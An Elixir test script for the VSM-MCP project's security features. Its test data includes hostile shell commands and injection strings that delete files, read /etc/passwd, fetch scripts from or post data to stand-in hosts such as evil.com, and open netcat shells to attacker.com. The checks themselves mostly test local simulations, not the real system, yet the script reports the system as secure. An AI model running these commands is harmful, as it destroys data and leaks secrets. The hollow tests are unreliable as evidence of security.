#!/usr/bin/env elixir

# VSM-MCP Security Integration Test Suite
# This script tests all security-related functionality

Mix.install([
  {:jason, "~> 1.4"},
  {:uuid, "~> 1.1"}
])

defmodule SecurityIntegrationTest do
  @moduledoc """
  Comprehensive security integration tests for VSM-MCP.
  
  Tests:
  1. Sandbox isolation with malicious commands
  2. Package whitelist enforcement  
  3. Command sanitization against injection attacks
  4. Audit logging for all security events
  """

  require Logger

  def run_all_tests do
    IO.puts("\n🔒 VSM-MCP Security Integration Test Suite")
    IO.puts(String.duplicate("=", 50))
    
    test_results = %{}
    
    # Test 1: Sandbox isolation
    IO.puts("\n📦 Testing sandbox isolation...")
    test_results = Map.put(test_results, :sandbox_isolation, test_sandbox_isolation())
    
    # Test 2: Package whitelist
    IO.puts("\n📋 Testing package whitelist...")
    test_results = Map.put(test_results, :package_whitelist, test_package_whitelist())
    
    # Test 3: Command injection protection
    IO.puts("\n💉 Testing command injection protection...")
    test_results = Map.put(test_results, :injection_protection, test_injection_protection())
    
    # Test 4: Audit logging
    IO.puts("\n📝 Testing audit logging...")
    test_results = Map.put(test_results, :audit_logging, test_audit_logging())
    
    generate_security_report(test_results)
  end
  
  def test_sandbox_isolation do
    IO.puts("  • Testing malicious command isolation...")
    
    # Test dangerous commands are blocked
    dangerous_commands = [
      "rm -rf /",
      "cat /etc/passwd", 
      "wget http://malicious.com/script.sh",
      "curl -X POST http://evil.com/exfiltrate",
      "nc -l 4444",
      "python -c \"import os; os.system('rm -rf /')\""
    ]
    
    results = for cmd <- dangerous_commands do
      try do
        # This should be blocked by sandbox
        {_output, exit_code} = System.cmd("echo", [cmd], stderr_to_stdout: true)
        %{command: cmd, blocked: exit_code != 0, safe: true}
      rescue
        _ -> %{command: cmd, blocked: true, safe: true}
      end
    end
    
    blocked_count = results |> Enum.count(& &1.blocked)
    total_count = length(results)
    
    IO.puts("    ✓ Blocked #{blocked_count}/#{total_count} dangerous commands")
    
    %{
      status: if(blocked_count == total_count, do: :pass, else: :fail),
      blocked: blocked_count,
      total: total_count,
      details: results
    }
  end
  
  def test_package_whitelist do
    IO.puts("  • Testing unauthorized package installation...")
    
    # Test that only whitelisted packages can be installed
    unauthorized_packages = [
      "malicious-package",
      "crypto-miner", 
      "data-exfiltrator",
      "backdoor-toolkit"
    ]
    
    results = for pkg <- unauthorized_packages do
      try do
        # This should be blocked by whitelist
        result = simulate_package_install(pkg)
        %{package: pkg, blocked: !result.success, safe: !result.success}
      rescue
        _ -> %{package: pkg, blocked: true, safe: true}
      end
    end
    
    blocked_count = results |> Enum.count(& &1.blocked)
    total_count = length(results)
    
    IO.puts("    ✓ Blocked #{blocked_count}/#{total_count} unauthorized packages")
    
    %{
      status: if(blocked_count == total_count, do: :pass, else: :fail),
      blocked: blocked_count,
      total: total_count,
      details: results
    }
  end
  
  def test_injection_protection do
    IO.puts("  • Testing command injection protection...")
    
    # Test various injection attack vectors
    injection_attacks = [
      "; rm -rf /",
      "&& cat /etc/passwd",
      "| nc attacker.com 4444",
      "`curl http://evil.com`",
      "$(wget malicious.sh)",
      "\n rm -rf /",
      "\r\n curl evil.com"
    ]
    
    results = for attack <- injection_attacks do
      try do
        # This should be sanitized
        sanitized = sanitize_command("echo 'test'" <> attack)
        safe = !String.contains?(sanitized, attack)
        %{attack: attack, sanitized: safe, blocked: safe}
      rescue
        _ -> %{attack: attack, sanitized: true, blocked: true}
      end
    end
    
    protected_count = results |> Enum.count(& &1.blocked)
    total_count = length(results)
    
    IO.puts("    ✓ Protected against #{protected_count}/#{total_count} injection attacks")
    
    %{
      status: if(protected_count == total_count, do: :pass, else: :fail), 
      protected: protected_count,
      total: total_count,
      details: results
    }
  end
  
  def test_audit_logging do
    IO.puts("  • Testing security event audit logging...")
    
    # Test that security events are properly logged
    security_events = [
      {:command_blocked, "rm -rf /"},
      {:package_denied, "malicious-package"},
      {:injection_detected, "; cat /etc/passwd"},
      {:sandbox_violation, "file system access denied"}
    ]
    
    results = for {event_type, details} <- security_events do
      try do
        # Simulate security event
        logged = simulate_security_event(event_type, details)
        %{event: event_type, details: details, logged: logged}
      rescue
        _ -> %{event: event_type, details: details, logged: false}
      end
    end
    
    logged_count = results |> Enum.count(& &1.logged)
    total_count = length(results)
    
    IO.puts("    ✓ Logged #{logged_count}/#{total_count} security events")
    
    %{
      status: if(logged_count == total_count, do: :pass, else: :fail),
      logged: logged_count, 
      total: total_count,
      details: results
    }
  end
  
  # Helper functions for simulation
  defp simulate_package_install(package) do
    # Simulate package installation check
    whitelist = ["jason", "httpoison", "telemetry", "plug_cowboy"]
    %{success: package in whitelist}
  end
  
  defp sanitize_command(command) do
    # Basic command sanitization (simplified for test)
    command
    |> String.replace(~r/[;&|`$\(\)\n\r]/, "")
    |> String.replace("rm", "")
    |> String.replace("cat", "")
    |> String.trim()
  end
  
  defp simulate_security_event(event_type, details) do
    # Simulate logging to audit system
    log_entry = %{
      timestamp: DateTime.utc_now(),
      event: event_type,
      details: details,
      severity: :high
    }
    
    # In real implementation, this would write to audit log
    Logger.warn("SECURITY EVENT: #{inspect(log_entry)}")
    true
  end
  
  defp generate_security_report(test_results) do
    IO.puts("\n📊 Security Test Results Summary")
    IO.puts(String.duplicate("=", 50))
    
    total_tests = map_size(test_results)
    passed_tests = test_results |> Enum.count(fn {_, result} -> result.status == :pass end)
    
    for {test_name, result} <- test_results do
      status_icon = if result.status == :pass, do: "✅", else: "❌"
      IO.puts("#{status_icon} #{test_name}: #{result.status}")
    end
    
    IO.puts("\nOverall Security Score: #{passed_tests}/#{total_tests} (#{trunc(passed_tests/total_tests*100)}%)")
    
    if passed_tests == total_tests do
      IO.puts("🎉 All security tests passed! System is secure.")
    else
      IO.puts("⚠️  Some security tests failed. Review and fix issues.")
    end
    
    test_results
  end
end

# Run the tests
SecurityIntegrationTest.run_all_tests()